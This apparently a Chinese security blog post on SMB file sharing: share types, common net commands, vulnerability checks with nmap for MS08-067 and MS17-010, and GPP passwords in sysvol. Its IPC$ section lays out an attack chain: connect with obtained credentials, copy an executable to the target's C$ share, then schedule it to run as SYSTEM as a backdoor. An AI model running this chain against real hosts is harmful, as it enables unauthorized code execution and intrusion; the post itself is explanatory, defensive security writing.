文件共享是大家常用的一种功能，其实在win中的共享功能都是通过smb协议来完成。接下来看看文件共享有哪些需要注意的安全点，本文仅做一次记录，方便后续查看。

## SMB协议

SMB(全称是Server Message Block)是一个协议名，可用于在计算机间共享文件、打印机、串口等，电脑上的网上邻居就是靠它实现的

SMB 是一种客户机/服务器、请求/响应协议。通过 SMB
协议，客户端应用程序可以在各种网络环境下读、写服务器上的文件，以及对服务器程序提出服务请求。此外通过 SMB
协议，应用程序可以访问远程服务器端的文件、以及打印机等资源。

SMB一开始的设计是在NetBIOS协议上运行的，而NetBIOS本身则运行在NetBEUI、IPX/SPX或TCP/IP协议上。

NetBIOS 使用下列端口：UDP/137（NetBIOS 名称服务）、UDP/138（NetBIOS 数据报服务）、TCP/139（NetBIOS
会话服务）；

SMB 使用下列端口：TCP/139、TCP/445。

#NetBIOS用于局域网内主机名发现。

### SMB协议的应用

win的文件共享功能就是通过SMB协议来完成的。

而为了实现linux与win直接的文件共享，开发出了samba软件，可以通过samba实现linux与win之间就像win之间一样文件共享。

在Windows操作系统中的共享有3类：普通共享、默认共享、IPC$共享，

1、普通共享：就是通常意义上的共享，即用户设置的共享目录、共享文件夹、共享分区等；

2、默认共享：Windows操作系统的隐含驱动器共享，通常有：

（1）驱动器共享：如C$、D$，开启后可直接访问分区中资源；

（2）系统管理共享admin$：通常指向C:\Windows。

3、IPC$共享：这实际不是共享，而是提供一种访问管道；IPC全称“Internet Process
Connection”，顾名思义，是为了进程间通信而开放的命名管道。

### 共享中的常用命令

    
    
    net use                               #查看连接
    net share                             #查看本地开启的共享
    net share ipc$                        #开启ipc$共享
    net view \\IP                          查看远程主机的共享
     
    net use \\IP\ipc$ "" /user:""   建立IPC空连接，不需要用户名和密码，一般权限比价低
    net use \\IP\ipc$ "password" /user:"username"  建立非空连接
    net time \\IP  查看远程主机的当前时间
    at \\ip 时间 程序名  设置定时任务
       
    查看目标主机的NetBIOS用户（自己本机也需开启）
    nbtstat -A 193.168.1.12
     
    删除连接
    net use \\193.168.1.12\ipc$ /del
     
    文件上传下载
    copy plugin_update.exe \\193.168.1.12\c$\windows\temp\plugin_update.exe   
    （上传到目标的:c\windows\temp\目录下）
     
    copy \\127.0.0.1\c$\test.exe c:\
    （下载到本地c盘下）
     
    net share ipc$ /delete
    删除默认共享  
     
    net share c$ /delete
    删除c盘共享
     
     
    限制IPC$缺省共享：
    HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Lsa 
    Name：restrictanonymous 
    Type：REG_DWORD 
    Value：0x0(缺省)          0x1 匿名用户无法列举本机用户列表             0x2 匿名用户无法连接本机IPC$共享        
    说明:不建议使用2，否则可能会造成你的一些服务无法启动，如SQL Server。

  

## IPC$利用

1.如果目标机器启动了IPC$，可以建立空连接，如果知道密码通过密码建立连接。

net use \\\IP\ipc$ "password" /user:"username"

PS. 如口令、用户名为空，则建立了所谓“空连接”，这种连接权限有限，仅为everyone级权限；因此，建议在通过社会工程等手段获取用户、口令后再尝试。

2.建立连接后，用net share
\\\目标服务器IP地址查看目标服务器所开放的共享资源，也可以直接尝试上传或访问某个共享（例如：admin$）、确认是否有可以利用的资源或信息；

3.建立连接以后可以尝试往目录里复制文件

copy \路径\srv.exe \IP\共享目录名，

如：copy ccbirds.exe \\...\c 即将当前目录下的文件复制到对方c盘内

4.设置计划任务，这样就可以执行copy上去的脚本

# 查看目标机器时间

net time \\\193.168.1.12

# 创建该时间之后的某个时刻自动执行任务，任务名 test_cron

schtasks /create /tn "test_cron" /tr c:\windows\temp\plugin_update.exe /sc
once /st 16:32 /S 193.168.1.12 /RU System /u administrator /p "passwd"

# 如果不想等，可以立即运行后门程序

schtasks /run /tn "test_cron" /S 193.168.1.12 /u administrator /p "passwd"

# 删除创建的任务

schtasks /F /delete /tn "test_cron" /S 193.168.1.12 /u administrator /p
"passwd"

  

## SMB常见的漏洞

### MS08-067

CVE-2008-4250微软编号为MS08-067，根据微软安全漏洞公告，基本可以了解其原理：

MS08-067漏洞是通过MSRPC over
SMB通道调用Server服务程序中的NetPathCanonicalize函数时触发的，而NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化（将路径字符串中的'/'转换为'',同时去除相对路径"."和".."），而在NetpwPathCanonicalize函数中发生了栈缓冲区内存错误，造成可被利用实施远程代码执行。

nmap检测是否存在该漏洞的命令：nmap --script smb-vuln-ms08-067 192.168.56.101

脚本地址 <https://svn.nmap.org/nmap/scripts/smb-vuln-ms08-067.nse>

### MS17-010

MS17-010（永恒之蓝）应用的不仅仅是一个漏洞，而是包含Windows SMB
远程代码执行漏洞CVE-2017-0143、CVE-2017-0144、CVE-2017-0145、CVE-2017-0146、CVE-2017-0147、CVE-2017-0148在内的6个SMB漏洞的攻击，所以攻击显得十分繁琐。

 **其它漏洞还有CVE-2009-3103，MS06-025，MS07-029，cve-2020-0796，cve-2020-1301。**

可以通过nmap探测是否存在这些漏洞

nmap -p445 --script smb-vuln-* 192.168.56.101

![1686727928_64896cf861d3c3295a825.png!small?1686727929171](https://image.3001.net/images/20230614/1686727928_64896cf861d3c3295a825.png!small?1686727929171)

## sysvol与GPP漏洞

上面说的都是本机的共享，其实域内还有一个特殊的共享sysvol。所有域内主机都能访问，里面保存组策略相关数据，包含登录脚本配置文件等

GPP:全称Group Policy Preferences,也就是我们常说的组策略。

sysvol为域内共享文件夹，里面保存着与组策略相关的信息，例如登录或注销脚本，组策略配置文件等，域内主机都能访问。域管理员在使用组策略批量管理域内主机时，如果在脚本或配置中引入用户密码，则会产生安全问题。

还有一种是在组策略首选项中输入了用户名和密码，这样会在相应的组策略文件夹下，有一个xml配置文件包含了以上的信息。针对这个GPP漏洞，微软发布了kb2962486补丁。（MS14-025）

通过对sysvol目录搜索vbs,psl,xml后缀的目录，说不定可以发现用户名和密码或者其他的敏感信息。

sysvol访问路径：\\\<domain>\\\SYSVOL\\\<domain>

公司内部使用共享服务是常见的，但在共享的时候要做好权限管理，不要把一些敏感文件分享出去。

  

